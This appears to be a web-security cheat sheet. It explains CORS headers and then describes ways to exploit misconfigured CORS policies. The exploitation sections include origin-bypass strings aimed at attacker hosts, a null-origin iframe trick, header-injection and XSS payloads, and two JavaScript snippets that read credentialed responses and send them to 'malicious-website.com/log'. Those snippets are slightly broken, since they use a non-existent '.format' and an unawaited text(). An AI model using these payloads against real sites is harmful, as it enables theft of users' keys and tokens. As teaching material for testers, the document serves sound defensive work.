# Cross-origin resource sharing (CORS)

Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP).

{% hint style="info" %}
The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain
{% endhint %}

The CORS standard works by adding new HTTP headers that let servers describe which origins are permitted to read that information from a web browser. A web application executes a cross-origin HTTP request when it requests a resource that has a different origin from its own.

{% hint style="info" %}
Origin is the following triple: (scheme, host, port)
{% endhint %}

For HTTP request methods that can cause side-effects on server data, the specification mandates that browsers preflight the request, soliciting supported methods from a server with the HTTP `OPTIONS` request method, and then, upon approval from a server, sending the actual request. 

Servers can also inform clients whether credentials should be sent with requests.

CORS failures result in errors, but specifics about the error are not available to JavaScript.

## Simple requests

Simple requests do not trigger a CORS preflight. A simple request is one that meets **all** the following conditions:

- One of the allowed methods:
    - `GET`
    - `HEAD`
    - `POST`
- The only allowed headers which can will be set manually:
    - `Accept`
    - `Accept-Language`
    - `Content-Language`
    - `Content-Type`
    - `DPR`
    - `Downlink`
    - `Save-Data`
    - `Viewport-Width`
    - `Width`
- The only allowed values for the `Content-Type` header:
    - `application/x-www-form-urlencoded`
    - `multipart/form-data`
    - `text/plain`
- No event listeners are registered on any `XMLHttpRequestUpload` object used in a request (these are accessed using the [XMLHttpRequest.upload](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/upload) property).
- No [ReadableStream](https://developer.mozilla.org/en-US/docs/Web/API/ReadableStream) object is used in a request.

## Preflighted requests

Preflighted requests first send a HTTP request by the `OPTIONS` method to a resource on an other domain, to determine if an actual request is safe to send. 

## Requests with credentials

Credentialed requests allow to send HTTP cookies and HTTP Authentication information (by default browsers will not send credentials).

When responding to a credentialed request, a server must specify an origin in a value of the `Access-Control-Allow-Origin` header, instead of specifying the `'*'` wildcard.

{% hint style="info" %}
Cookies set in CORS responses are subject to normal third-party cookie policies
{% endhint %}

## The HTTP request headers

This section describes headers that a client may set when issuing HTTP requests in order to make use of the CORS feature. These headers are set by a browser when making requests to a server. Developers using cross-site `XMLHttpRequest` capability do not have to set any CORS headers programmatically.

### Origin

```http
Origin: <origin>
```

The `Origin` header indicates an origin of a cross-site access request or preflight request. The `origin` parameter is a URI indicating a server from which the request initiated. It does not include any path information, but only a server name.

{% hint style="info" %}
The origin value can be null, or a URI

In any access control request, the `Origin` header is always sent
{% endhint %}

### Access-Control-Request-Method

```http
Access-Control-Request-Method: <method>
```

The `Access-Control-Request-Method` is used when issuing a preflight request to let a server know what HTTP method will be used when an actual request is made.

### Access-Control-Request-Headers

```http
Access-Control-Request-Headers: <field-name>[, <field-name>]*
```

The `Access-Control-Request-Headers` header is used when issuing a preflight request to let a server know what HTTP headers will be used when an actual request is made.

## The HTTP Response Headers

This section describes HTTP response headers that a server sends back for access control requests as defined by the CORS specification.

### Access-Control-Allow-Origin

```http
Access-Control-Allow-Origin: <origin-or-null> | *
```

The `Access-Control-Allow-Origin` specifies either a single origin ([or null](https://www.w3.org/TR/cors/#access-control-allow-origin-response-header)), which tells browsers to allow that origin to access a resource. For requests without credentials - the `'*'` wildcard, to tell browsers to allow any origin to access a resource.

If a server specifies a single origin rather than the `'*'` wildcard, a server should also set `Origin` in the [Vary](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Vary) response header - to indicate to clients that server responses will differ based on the value of the `Origin` request header.

### Access-Control-Allow-Methods

```http
Access-Control-Allow-Methods: <method>[, <method>]*
```

The `Access-Control-Allow-Methods` header specifies a method or methods allowed when accessing a resource. This is used in response to a preflight request.

### Access-Control-Allow-Headers

```http
Access-Control-Allow-Headers: <header-name>[, <header-name>]*
```

The `Access-Control-Allow-Headers` header is used in response to a preflight request to indicate which HTTP headers can be used when making the actual request.

### Access-Control-Expose-Headers

```http
Access-Control-Expose-Headers: <header-name>[, <header-name>]*
```

The `Access-Control-Expose-Headers` header lets a server whitelist headers that browsers are allowed to access. By default, browsers have access to only the 7 CORS-safelisted response headers:
- `Cache-Control`
- `Content-Language`
- `Content-Length`
- `Content-Type`
- `Expires`
- `Last-Modified`
- `Pragma`

### Access-Control-Max-Age

```http
Access-Control-Max-Age: <delta-seconds>
```

The `Access-Control-Max-Age` header indicates how long results of a preflight request can be cached.

### Access-Control-Allow-Credentials

```http
Access-Control-Allow-Credentials: true
```

When a request's credentials mode ([Request.credentials](https://developer.mozilla.org/en-US/docs/Web/API/Request/credentials)) is `include`, browsers will only expose a response to frontend JavaScript code if the `Access-Control-Allow-Credentials` value is true.

Credentials are cookies, authorization headers or TLS client certificates.

# CORS misconfiguration

## Abusing CORS without credentials

If a victim's network location works as a kind of authentication, you can use a victim’s browser as a proxy to bypass IP-based authentication and access applications within an internal network.

In terms of impact this is similar to DNS rebinding.

## Breaking TLS with poorly configured CORS

Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For instance, when an application receives the following request:

```http
GET /api/request/api_key HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

An application responds with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

In such case, an attacker who is in a position to intercept a victim's traffic can exploit the CORS configuration to compromise a victim's interaction with the application. The attack involves the next steps:

1. A victim user makes any plain HTTP request
2. An attacker injects a redirection to `http://trusted-subdomain.vulnerable-website.com`
3. A victim's browser follows the redirect
4. An attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to `https://vulnerable-website.com`
5. A victim's browser makes the CORS request, including the `http://trusted-subdomain.vulnerable-website.com` as an origin
6. An application allows the request because the origin is whitelisted; requested sensitive data is returned in the response
7. An attacker's spoofed page can read the sensitive data and transmit it to any domain under their control

The attack is effective even if a vulnerable application is otherwise robust in its usage of HTTPS, with no HTTP endpoint and all cookies flagged as secure.

## Broken parser

Most servers use basic string operations to verify the `Origin` header, but some parse it as a URL instead. This allows you to exploit the browser's tolerance for unusual characters in domain names.

In Safari, `https://website.com%60.attacker.com/` is a valid URL. If a CORS request originating from that URL, the `Origin` header will look like next one:

```http
Origin: https://website.com`.attacker.com/
``` 

A server may parse this header as `https://website.com` omitting the `` `.attacker.com/ `` part. 

Chrome and Firefox supported the `_` character in subdomains, that can be used instead of `` ` `` to exploit Firefox and Chrome users.

You can also try to use other approaches to break a validation:

```http
expected-host.com.attacker.com
expected-host.computer
foo@evil-host:80@expected-host
foo@evil-host%20@expected-host
evil-host%09expected-host
127.1.1.1:80\@127.2.2.2:80
127.1.1.1:80:\@@127.2.2.2:80
127.1.1.1:80#\@127.2.2.2:80
ß.evil-host
```

References:
- [Research: Advanced CORS Exploitation Techniques](https://www.corben.io/advanced-cors-techniques/)
- [Server Side Request Forgery: Broken parser](https://0xn3va.gitbook.io/cheat-sheets/web-application/server-side-request-forgery#broken-parser)
- [@HolyBugx tweet](https://mobile.twitter.com/HolyBugx/status/1464904818242338820)

## Exploiting XSS via CORS trust relationships

Even "correctly" configured CORS establishes a trust relationship between two origins. If an application trusts an origin that is vulnerable to XSS, an attacker can inject JavaScript to retrieve sensitive information from the application using CORS.

Given the following request:

```http
GET /api/request/api_key HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

If an application responds with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

An attacker who finds an XSS vulnerability on `subdomain.vulnerable-website.com` could use that to retrieve an API key using a URL like: `https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`

## Generation the Access-Control-Allow-Origin header

No browsers actually support a space-separated list of origins (the specification suggests this):

```http
Access-Control-Allow-Origin: http://foo.com http://bar.net
```

Additionally, a wildcard does not allow you to trust all subdomains:

```http
Access-Control-Allow-Origin: *.bar.net
```

There is only wildcard origin `'*'`.

Since you can't use wildcard in `Access-Control-Allow-Origin` when credentials flag is true, check [Access-Control-Allow-Origin](#access-control-allow-origin), many applications programmatically generate the `Access-Control-Allow-Origin` header based on the user-supplied `Origin` value. If you see a HTTP response with any `Access-Control-*` headers but no origins declared, this is a strong indication that an application will generate the header based on a user input. Other applications will only send CORS headers if they receive a request containing the `Origin` header, making associated vulnerabilities extremely easy to miss.

For instance, an application receives the following request:

```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=<token>
```

and responds with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

If the response contains any sensitive information such as an API key or CSRF token, you can retrieve this by placing the following script on your resource:

```js
fetch("https://vulnerable-website.com/sensitive-victim-data", {
    credentials: "include"
})
    .then((response) => {
        document.location = "//malicious-website.com/log?key={0}".format(response.text());
    });
```

## Server-side cache poisoning

If an application reflects the `Origin` header without even checking it for illegal characters like `\r`, you have a HTTP header injection vulnerability against IE/Edge users, because IE and Edge view `\r (0x0d)` as a valid HTTP header terminator:

```http
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```

Internet Explorer sees the response as:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```

This is not directly exploitable because there is no way for an attacker to make someone's browser send such a malformed header, but you can manually craft this request and a server-side cache may save the response and serve it to other people. The current payload will change the page's character set to UTF-7, which is notoriously useful for creating XSS vulnerabilities.

## The null origin

The specification for the `Origin` header supports the value `null`. Browsers might send the value `null` in the `Origin` header in various unusual situations:

- Cross-site redirects
- Requests from serialized data
- Request using the `file:` protocol
- Sandboxed cross-origin requests

Some applications might whitelist the `null` origin to support local development of the application.

For instance, application receives the following request:

```http
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

and responds with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
...
```

In such case, an attacker can use various tricks to generate a cross-domain request containing the value `null` in the `Origin` header. This will satisfy the whitelist, leading to cross-domain access. For example, this can be done using a sandboxed iframe cross-origin request of the form:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
fetch('https://vulnerable-website.com/sensitive-victim-data', {
    credentials: 'include'
})
    .then((response) => {
        document.location = '//malicious-website.com/log?key={0}'.format(response.text());
    });
</script>"></iframe>
```

## Vary: Origin and client-side cache poisoning

The CORS specification instructs developers specify `Origin` in the `Vary` response header whenever `Access-Control-Allow-Origin` headers are dynamically generated.

```http
Vary: Origin
```

That might sound pretty simple, but immense numbers of developers forget, including the [W3C itself](https://lists.w3.org/Archives/Public/public-webappsec/2016Jun/0057.html). 

Suppose an application reflects the contents of a custom header without encoding (reflected XSS in a custom HTTP header):

```http
GET / HTTP/1.1
Host: vulnerable-website.com
X-User-id: <svg/onload=alert(1)>

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-User-id
Content-Type: text/html
...

Invalid user: <svg/onload=alert(1)>
```

Without CORS, this is impossible to exploit as there is no way to make someone's browser send the `X-User-id` header cross-domain. 

With CORS, you can make them send this request. By itself, that is useless since the response containing injected JavaScript will not be rendered. However, if `Vary: Origin` has not been specified the response may be stored in the browser's cache and displayed directly when the browser navigates to the associated URL.

# References

- [MDN Web Docs: Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
- [MDN Web Docs: Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [Portswigger Research: Exploiting CORS misconfigurations for Bitcoins and bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
- [Writeup: Tricky CORS Bypass in Yahoo! View](https://www.corben.io/tricky-CORS/)
- [Report: SOP bypass using browser cache](https://hackerone.com/reports/761726)
